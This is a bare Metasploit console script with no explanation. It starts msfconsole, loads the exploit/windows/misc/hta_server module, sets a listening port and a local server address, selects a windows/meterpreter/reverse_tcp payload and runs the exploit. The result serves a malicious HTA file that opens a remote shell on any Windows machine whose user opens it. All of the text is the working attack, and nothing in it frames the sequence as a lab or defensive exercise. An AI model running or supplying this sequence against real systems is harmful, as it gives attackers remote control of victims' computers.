msfconsole
use exploit/windows/misc/hta_server
set lport 8111
set srvhost 192.168.0.162
set payload windows/meterpreter/reverse_tcp
exploit
